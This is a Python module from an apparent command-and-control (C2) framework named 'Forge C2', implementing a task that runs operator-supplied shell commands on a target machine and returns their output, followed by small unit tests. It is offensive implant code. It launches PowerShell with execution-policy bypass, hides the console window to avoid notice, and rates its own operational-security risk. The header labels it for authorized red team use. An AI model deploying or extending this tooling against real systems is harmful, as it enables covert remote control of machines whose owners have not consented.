"""
Forge C2 — Shell Task
=========================
Execute shell commands on the target system.

The bread and butter of C2 — runs commands via subprocess
and returns stdout/stderr.

Supports:
    • Windows (cmd.exe, PowerShell)
    • Linux/macOS (bash, sh)
    • Timeout enforcement
    • Working directory control
    • Environment variable injection

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import os
import platform
import time
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.shell")


@register_task
class ShellTask(BaseTask):
    """Execute a shell command on the target.

    Args (via kwargs):
        cmd:         The command string to execute.
        shell:       Shell to use ("cmd", "powershell", "bash", "sh", "auto").
        cwd:         Working directory (empty = current).
        env:         Extra environment variables (dict).
        hide_window: Windows-only: hide the console window.

    Returns:
        TaskResult with combined stdout+stderr as output.

    Usage::

        task = ShellTask(task_id="t1", cmd="whoami /all")
        result = await task.execute()
        print(result.output)  # → "NT AUTHORITY\\SYSTEM ..."
    """

    TASK_TYPE = "shell"
    DESCRIPTION = "Execute shell command"
    OPSEC_RISK = "medium"

    async def execute(self) -> TaskResult:
        cmd = self.args.get("cmd", "")
        shell_type = self.args.get("shell", "auto")
        cwd = self.args.get("cwd", None)
        extra_env = self.args.get("env", {})
        hide_window = self.args.get("hide_window", True)

        if not cmd:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error="No command provided",
            )

        start = time.time()

        try:
            # Determine shell
            if shell_type == "auto":
                is_windows = platform.system() == "Windows"
                shell_cmd = ["cmd.exe", "/c", cmd] if is_windows else ["bash", "-c", cmd]
            elif shell_type == "powershell":
                shell_cmd = [
                    "powershell.exe", "-NoProfile", "-NonInteractive",
                    "-ExecutionPolicy", "Bypass", "-Command", cmd,
                ]
            elif shell_type == "cmd":
                shell_cmd = ["cmd.exe", "/c", cmd]
            else:
                shell_cmd = [shell_type, "-c", cmd]

            # Merge environment
            env = dict(os.environ)
            env.update(extra_env)

            # Execute
            creation_flags = 0
            if platform.system() == "Windows" and hide_window:
                creation_flags = 0x08000000  # CREATE_NO_WINDOW

            proc = await asyncio.create_subprocess_exec(
                *shell_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=cwd,
                env=env,
                **({"creationflags": creation_flags} if platform.system() == "Windows" else {}),
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=self.timeout,
            )

            output = stdout.decode(errors="replace")
            if stderr:
                err_text = stderr.decode(errors="replace")
                if err_text.strip():
                    output += f"\n[STDERR]\n{err_text}"

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=output,
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "cmd": cmd,
                    "shell": shell_type,
                    "exit_code": proc.returncode,
                    "pid": proc.pid,
                },
            )

        except asyncio.TimeoutError:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.TIMEOUT,
                error=f"Command timed out after {self.timeout}s",
                started_at=start,
                completed_at=time.time(),
                metadata={"cmd": cmd},
            )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
                metadata={"cmd": cmd},
            )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestShellTask:
    """Tests for shell task."""

    def test_encode(self) -> None:
        task = ShellTask(task_id="t1", cmd="whoami")
        encoded = task.encode()
        assert encoded["type"] == "shell"
        assert encoded["args"]["cmd"] == "whoami"

    def test_decode(self) -> None:
        data = {"task_id": "t2", "type": "shell", "args": {"cmd": "id"}}
        task = ShellTask.decode(data)
        assert task.task_id == "t2"
        assert task.args["cmd"] == "id"

    def test_no_command(self) -> None:
        import asyncio
        task = ShellTask(task_id="t3")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED
